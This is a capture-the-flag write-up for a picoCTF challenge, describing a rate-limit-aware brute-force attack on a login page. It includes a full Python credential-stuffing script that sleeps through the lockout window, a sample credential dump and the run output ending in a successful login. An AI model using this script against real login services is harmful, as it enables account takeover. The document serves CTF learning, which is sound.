@@ -1,0 +1,161 @@
+Step 1: Initial Reconnaissance
+
+First, I attempted to access the web application at the target URL:
+bash
+
+http://candy-mountain.picoctf.net:61395
+
+The site presented a login page requiring username and password credentials. Initial manual testing showed that invalid credentials returned an "Invalid username or password" message, and after several failed attempts, a "Rate Limited" message appeared.
+Step 2: Identifying the Vulnerability
+
+After testing the rate limit behavior, I discovered:
+
+    Rate Limit Threshold: 11 failed login attempts
+
+    Lockout Duration: 30 seconds
+
+    Response Codes: 200 OK for both success/failure with different messages
+
+    Success Response: 302 redirect to / (homepage)
+
+The application lacked CAPTCHA or IP-based blocking, making it vulnerable to a patient brute-force attack.
+Step 3: Creating the Exploit Script
+
+I created a Python script smart_brute.py that intelligently handles the rate limiting:
+python
+
+import requests
+import re
+from time import sleep
+
+# Target configuration
+url = "http://candy-mountain.picoctf.net:61395"
+login_endpoint = "/login"  # Assuming login endpoint
+
+# Load credentials from file
+credentials = []
+with open("creds-dump.txt", "r") as f:
+    for line in f:
+        if ":" in line:
+            username, password = line.strip().split(":", 1)
+            credentials.append((username, password))
+
+print(f"[*] Loaded {len(credentials)} credentials")
+print(f"[*] Target: {url}")
+
+# Session for maintaining cookies/session
+session = requests.Session()
+found = False
+attempt_count = 0
+
+# Main brute-force loop
+for i, (username, password) in enumerate(credentials, 1):
+    attempt_count += 1
+    print(f"[{i}/{len(credentials)}] Testing {username}:{password[:5]}...")
+    
+    try:
+        # Prepare login data
+        login_data = {
+            "username": username,
+            "password": password
+        }
+        
+        # Send login request
+        response = session.post(f"{url}{login_endpoint}", 
+                                data=login_data, 
+                                allow_redirects=False)
+        
+        # Check for successful login (302 redirect)
+        if response.status_code == 302:
+            print(f"\n[DEBUG] Got 302 redirect to: {response.headers.get('Location', 'N/A')}\n")
+            
+            # Follow the redirect to get the flag
+            flag_response = session.get(f"{url}/")
+            
+            # Extract flag using regex
+            flag_match = re.search(r'picoCTF\{[^}]+\}', flag_response.text)
+            if flag_match:
+                print(f"\n[!!!] SUCCESS! Valid credentials found: {username}:{password}")
+                print(f"\n[+] FLAG: {flag_match.group()}")
+                found = True
+                break
+            else:
+                print("\n[!] Logged in but flag not found in response")
+        
+        # Handle rate limiting
+        elif "Rate Limited" in response.text:
+            print(f"\n[!] Rate limited after {attempt_count} attempts!")
+            print("[*] Waiting 30 seconds for rate limit to reset...")
+            sleep(30)
+            attempt_count = 0
+            continue
+            
+    except Exception as e:
+        print(f"\n[!] Error: {e}")
+        continue
+
+# Final check if no credentials worked
+if not found:
+    print("\n\n[*] No credentials found in scan. Checking index page directly...")
+    try:
+        direct_response = requests.get(f"{url}/", timeout=5)
+        flag_match = re.search(r'picoCTF\{[^}]+\}', direct_response.text)
+        if flag_match:
+            print(f"\n[+] FLAG FOUND ON INDEX PAGE: {flag_match.group()}")
+        else:
+            print("[!] No flag found on index page")
+    except Exception as e:
+        print(f"[!] Error checking index: {e}")
+
+Step 4: Preparing the Credentials List
+
+I needed a wordlist of potential credentials. The file creds-dump.txt contained username:password pairs:
+text
+
+admin:admin123
+user:password
+rohit:berryere1
+cymbre:california
+ngai:elliengeni
+meena:tracyper1s
+paulo:chickssten
+linnet:yayancorde
+...
+
+Step 5: Executing the Attack
+
+Running the script:
+bash
+
+python3 smart_brute.py
+
+Execution Output:
+text
+
+[*] Loaded 100 credentials
+[*] Target: http://candy-mountain.picoctf.net:61395
+[11/100] Testing cymbre:california
+[!] Rate limited after 11 attempts!
+[*] Waiting 30 seconds for rate limit to reset...
+
+[22/100] Testing ngai:elliengeni
+[!] Rate limited after 11 attempts!
+[*] Waiting 30 seconds for rate limit to reset...
+
+[33/100] Testing meena:tracyper1s
+[!] Rate limited after 11 attempts!
+[*] Waiting 30 seconds for rate limit to reset...
+
+[44/100] Testing paulo:chickssten
+[!] Rate limited after 11 attempts!
+[*] Waiting 30 seconds for rate limit to reset...
+
+[55/100] Testing linnet:yayancorde
+[!] Rate limited after 11 attempts!
+[*] Waiting 30 seconds for rate limit to reset...
+
+[61/100] Testing rohit:berryere1
+
+[DEBUG] Got 302 redirect to: /
+
+[!!!] SUCCESS! Valid credentials found: rohit:berryere1
